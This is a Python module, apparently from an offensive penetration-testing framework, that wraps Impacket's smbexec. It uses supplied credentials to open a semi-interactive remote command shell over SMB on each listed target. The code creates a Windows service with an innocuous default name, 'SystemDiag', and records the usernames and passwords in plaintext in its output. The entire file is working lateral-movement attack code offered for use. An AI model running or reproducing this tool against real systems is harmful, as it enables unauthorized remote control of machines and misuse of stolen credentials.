"""

Execute impacket's smbexec shell on a partiular host.

This creates a semi-interactive shell without uploading
a binary, but creates lots of shit in the event logs!

All cred to the the awesome Impacket project !
    https://code.google.com/p/impacket/


Module built by @harmj0y
"""

from lib import impacket_smbexec
from lib import helpers

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):

        self.name = "Smbexec Shell"
        self.description = ("Execute Impacket's smbexec.py module to create a "
                            "semi-interactive shell on a target without "
                            "uploading any binaries.")

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # any relevant text to echo to the output file
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"service_name" : ["SystemDiag", "Name of the service created on the box."]}

    def run(self):
        
        # assume single set of credentials for this module
        username, password = self.creds[0]

        # see if we need to extract a domain from "domain\username"
        domain = ""
        if "/" in username:
            domain,username = username.split("/")

        # the service name to create on the box
        serviceName = self.required_options["service_name"][0]

        executer = impacket_smbexec.CMDEXEC("445/SMB", username, password, domain, None, "SHARE", "C$", serviceName=serviceName)
        print "\n\n [*] Type "+helpers.color("'exit'") + " to exit the shell\n"

        for target in self.targets:
            executer.run(target)
            self.output += "[*] Impacket smbexec.py shell run using creds '"+username+":"+password+"' on "+target+"\n"

